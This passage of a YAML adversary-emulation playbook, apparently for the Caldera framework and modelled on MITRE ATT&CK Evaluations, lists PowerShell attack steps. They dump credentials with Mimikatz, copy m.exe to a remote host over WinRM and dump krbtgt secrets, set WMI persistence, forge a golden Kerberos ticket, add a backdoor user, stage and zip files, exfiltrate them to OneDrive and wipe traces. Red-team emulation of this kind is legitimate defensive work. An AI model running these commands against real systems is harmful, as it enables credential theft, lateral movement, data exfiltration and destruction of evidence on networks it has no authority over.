  name:  Credential Dumping
  tactic:  credential-access
  technique_name:  "Credential Dumping"
  technique_id:  T1003
  executors: 
   - psh:
     platform: windows
     command: |
       . .\stepFourteen_credDump.ps1;
   - pwsh:
     platform: windows
     command: |
       . .\stepFourteen_credDump.ps1;
 1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24:
  name:  Stage Mimikatz Binary
  tactic:  credential-access
  technique_name:  "Credential Dumping"
  technique_id:  T1003
  executors: 
   - psh:
     platform: windows
     command: |
       write-host "[+] Successfully downloaded m.exe";
   - pwsh:
     platform: windows
     command: |
       write-host "[+] Successfully downloaded m.exe";
 43aad2d6-d16a-4adb-aa2b-9510a3be4c52:
  name:  WMI Persistence technique
  tactic:  persistence
  technique_name:  "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
  technique_id:  T1546.003
  executors: 
   - psh:
     platform: windows
     command: |
       Get-WmiObject -Namespace "root/subscription" -list | findstr /i "__Filter";
       if ($?) {
         write-host "[*] WMI script has already executed on this machine. Not loading and executing wmi script.";
         exit 1;
       } else {
         . .\stepFifteen_wmi.ps1;
         wmi;
         if ($?) {
           write-host "[+] WMI script has successfully executed!";
           exit 0;
         }
         exit 1;
       }
   - pwsh:
     platform: windows
     command: |
       Get-WmiObject -Namespace "root/subscription" -list | findstr /i "__Filter";
       if ($?) {
         write-host "[*] WMI script has already executed on this machine. Not loading and executing wmi script.";
         exit 1;
       } else {
         . .\stepFifteen_wmi.ps1;
         wmi;
         if ($?) {
           write-host "[+] WMI script has successfully executed!";
           exit 0;
         }
         exit 1;
       }
 1c8552c7-f7ed-4523-b640-72d65af5f855:
  name:  Enumerate Domain Controller
  tactic:  discovery
  technique_name:  "Remote System Discovery"
  technique_id:  T1018
  executors: 
   - psh:
     platform: windows
     command: |
       . .\powerview.ps1;
       get-netdomaincontroller;
   - pwsh:
     platform: windows
     command: |
       . .\powerview.ps1;
       get-netdomaincontroller;
 a42be479-fc26-4d7c-9e63-7a9b74e4c8d2:
  name:  Enumerate Domain SID
  tactic:  discovery
  technique_name:  "System Owner/User Discovery"
  technique_id:  T1033
  executors: 
   - psh:
     platform: windows
     command: |
       . .\stepSixteen_SID.ps1;
       siduser;
   - pwsh:
     platform: windows
     command: |
       . .\stepSixteen_SID.ps1;
       siduser;
 acecc8f7-18c2-41fd-87bc-39ffd644e4e9:
  name:  Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping
  tactic:  lateral-movement
  technique_name:  "Ingress Tool Transfer"
  technique_id:  T1105
  executors: 
   - psh:
     platform: windows
     command: |
       . .\invoke-winrmsession.ps1;
       $session = invoke-winrmsession -Username "#{target.winrm.username}" -Password "#{target.winrm.password}" -IPAddress "#{target.winrm.remote_host}";
       Copy-Item m.exe -Destination "C:\Windows\System32\\" -ToSession $session -force;
       if ($?) {
         write-host "[+] Successfully copied m.exe to remote host";
       } else {
         write-host "[!] Error, copying and executing m.exe on remote host";
       }
       Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string
   - pwsh:
     platform: windows
     command: |
       . .\invoke-winrmsession.ps1;
       $session = invoke-winrmsession -Username "#{target.winrm.username}" -Password "#{target.winrm.password}" -IPAddress "#{target.winrm.remote_host}";
       Copy-Item m.exe -Destination "C:\Windows\System32\\" -ToSession $session -force;
       if ($?) {
         write-host "[+] Successfully copied m.exe to remote host";
       } else {
         write-host "[!] Error, copying and executing m.exe on remote host";
       }
       Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string
 b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c:
  name:  Collect E-mails
  tactic:  collection
  technique_name:  "Email Collection: Local Email Collection"
  technique_id:  T1114.001
  executors: 
   - psh:
     platform: windows
     command: |
       . .\stepSeventeen_email.ps1;
       Write-Host "Emails Collected";
   - pwsh:
     platform: windows
     command: |
       . .\stepSeventeen_email.ps1;
       Write-Host "Emails Collected";
 fc231955-774f-442c-ac0e-e74dfda50c5c:
  name:  Collect Files & Compress Collection
  tactic:  collection
  technique_name:  "Data from Local System"
  technique_id:  T1005
  executors: 
   - psh:
     platform: windows
     command: |
       try{
         if (!(test-path -path "C:\Windows\Temp\WindowsParentalControlMigration" -ErrorAction Stop)) {
           New-Item -Path "C:\Windows\temp\" -Name "WindowsParentalControlMigration" -ItemType "directory" -force;
         }
       } catch {
         write-host "[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt";
         exit 1;
       }
       
       if (! (test-path -path "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML")) {
         write-host "[!] Error, MITRE-ATTACK-EVALS.HTML was not found.";
         exit 1;
       }
       Copy-Item "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration" -force;
       . .\stepSeventeen_zip.ps1;
       zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
       if ($?) {
         write-host "[+] Documents successfully staged for collection.";
       }
   - pwsh:
     platform: windows
     command: |
       try{
         if (!(test-path -path "C:\Windows\Temp\WindowsParentalControlMigration" -ErrorAction Stop)) {
           New-Item -Path "C:\Windows\temp\" -Name "WindowsParentalControlMigration" -ItemType "directory" -force;
         }
       } catch {
         write-host "[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt";
         exit 1;
       }
       
       if (! (test-path -path "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML")) {
         write-host "[!] Error, MITRE-ATTACK-EVALS.HTML was not found.";
         exit 1;
       }
       Copy-Item "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration" -force;
       . .\stepSeventeen_zip.ps1;
       zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
       if ($?) {
         write-host "[+] Documents successfully staged for collection.";
       }
 4840d6dd-da13-401a-be46-05db56f4e1e0:
  name:  Exfiltrate data to OneDrive
  tactic:  exfiltration
  technique_name:  "Transfer Data to Cloud Account"
  technique_id:  T1537
  executors: 
   - psh:
     platform: windows
     command: |
       $err = $(net use y: #{onedrive.url} /user:#{onedrive.username} "#{onedrive.password}" 2>&1);
       if($err -Like "*System error 85*") {
         Write-Host "OneDrive net drive is already mounted!";
       } elseif($err -Like "*System error 67*") {
         Write-Host "OneDrive net drive mount failed - Check URL!";
         Write-Host "#{onedrive.url}";
         exit 1;
       } elseif($err -Like "*System error 1244*") {
         Write-Host "Could not authenticate to OneDrive - Check Creds!";
         Write-Host "User: #{onedrive.username}";
         Write-Host "Password: #{onedrive.password}";
         exit 1;
       }
       
       Write-Host "Mount Successful"
       Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "y:\WindowsParentalControlMigration.tmp" -Force;
       if(!$?){
         exit 1;
       }
       
       Write-Host "Copy Successfull"
       exit 0;
   - pwsh:
     platform: windows
     command: |
       $err = $(net use y: #{onedrive.url} /user:#{onedrive.username} "#{onedrive.password}" 2>&1);
       if($err -Like "*System error 85*") {
         Write-Host "OneDrive net drive is already mounted!";
       } elseif($err -Like "*System error 67*") {
         Write-Host "OneDrive net drive mount failed - Check URL!";
         Write-Host "#{onedrive.url}";
         exit 1;
       } elseif($err -Like "*System error 1244*") {
         Write-Host "Could not authenticate to OneDrive - Check Creds!";
         Write-Host "User: #{onedrive.username}";
         Write-Host "Password: #{onedrive.password}";
         exit 1;
       }
       
       Write-Host "Mount Successful"
       Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "y:\WindowsParentalControlMigration.tmp" -Force;
       if(!$?){
         exit 1;
       }
       
       Write-Host "Copy Successfull"
       exit 0;
 f820b93d-6176-4a72-a138-a70b0b549c49:
  name:  Data Wiping of staged files
  tactic:  impact
  technique_name:  "Disk Wipe: Disk Content Wipe"
  technique_id:  T1561.001
  executors: 
   - psh:
     platform: windows
     command: |
       . .\wipe.ps1;
       wipe "m.exe";
       wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp";
       wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML";
   - pwsh:
     platform: windows
     command: |
       . .\wipe.ps1;
       wipe "m.exe";
       wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp";
       wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML";
 267bad86-3f06-49f1-9a3e-6522f2a61e7a:
  name:  Execute Invoke-Mimikatz
  tactic:  credential-access
  technique_name:  "Credential Dumping"
  technique_id:  T1003
  executors: 
   - psh:
     platform: windows
     command: |
       klist purge;
       . .\Invoke-Mimikatz.ps1;
       invoke-mimikatz -command "kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt";
       klist;
       invoke-command -ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};
   - pwsh:
     platform: windows
     command: |
       klist purge;
       . .\Invoke-Mimikatz.ps1;
       invoke-mimikatz -command "kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt";
       klist;
       invoke-command -ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};
 afb8d8f7-d059-4825-95ae-c5727e2db320:
  name:  Triggering Persistent
  tactic:  persistence
  technique_name:  "Signed Binary Proxy Execution: Rundll32"
  technique_id:  T1218.011
  executors: 
   - psh:
     platform: windows
     command: |
       Restart-Computer -Force;
   - pwsh:
     platform: windows
     command: |
       Restart-Computer -Force;
